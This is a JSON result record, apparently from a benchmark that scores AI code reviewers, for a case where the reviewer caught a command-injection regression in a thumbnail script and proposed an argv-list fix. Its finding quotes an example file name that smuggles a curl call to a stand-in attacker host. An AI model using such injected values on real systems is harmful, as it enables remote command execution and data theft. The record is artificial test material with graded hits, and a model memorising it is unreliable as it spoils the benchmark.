@@ -1,0 +1,95 @@
+{
+  "case": "C005",
+  "pr": "C005",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.6",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "7695481624f1",
+  "turns": 5,
+  "tool_calls": null,
+  "seconds": 66.8,
+  "setup_seconds": 0.0,
+  "total_seconds": 66.8,
+  "usage": {
+    "in": 32278,
+    "cache_read": 120064,
+    "cache_write": 0,
+    "out": 3639,
+    "source": "cli"
+  },
+  "cost_usd": 0.146422,
+  "changed_files": [
+    "thumbs.py"
+  ],
+  "findings": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity": "critical",
+      "body": "If `name`, `upload_dir`, or `oid` contains a shell metacharacter (`;`, `|`, `$()`, backticks, spaces, newlines), this `subprocess.run(..., shell=True)` executes attacker-controlled commands as the reviewer process user. The previous argv-list form already isolated those values from the shell; ImageMagick 7 policy delegates are applied by `convert` itself from policy.xml and do not require a shell wrapper. A crafted `name` such as `x.png; curl attacker.example/exfil` would run after conversion.\n\nPass the binary and operands as an argv list, and keep the absolute path so PATH hijacking is not introduced in the same change:\n\n```suggestion\n        [\"/usr/bin/convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n```"
+    }
+  ],
+  "summary": "This change interpolates `upload_dir`, `name`, and `oid` into a `shell=True` command, which is command injection at the thumbnail conversion boundary. ImageMagick policy delegates are configured in policy.xml and invoked by convert itself; they do not require Python to run the conversion through a shell. Restore the argv-list form (and the `/usr/bin/convert` path) so those values never reach a shell.\n\n**Recommendation:** request-changes",
+  "round": "full",
+  "effective_max_turns": 40,
+  "budget": {
+    "tier": "critical",
+    "profile": "auto",
+    "turns": 40,
+    "alias": "deep",
+    "model": "grok-4.6",
+    "output_tokens": 8192,
+    "verifier_warning_pct": 100,
+    "patch_bytes": 200000,
+    "native_cap_applied": true
+  },
+  "prior_finding_updates": {},
+  "prior_findings_kept": [],
+  "outstanding_verdicts": [],
+  "verification": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The change replaces a safe argv-list `subprocess.run` with an f-string and `shell=True`, interpolating `upload_dir`, `name`, and `oid` into the shell. That is a real command-injection regression; ImageMagick policy does not require a shell wrapper."
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 9.66,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 0,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 2465,
+      "out": 365
+    },
+    "cost_usd": 0.008067
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C005-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
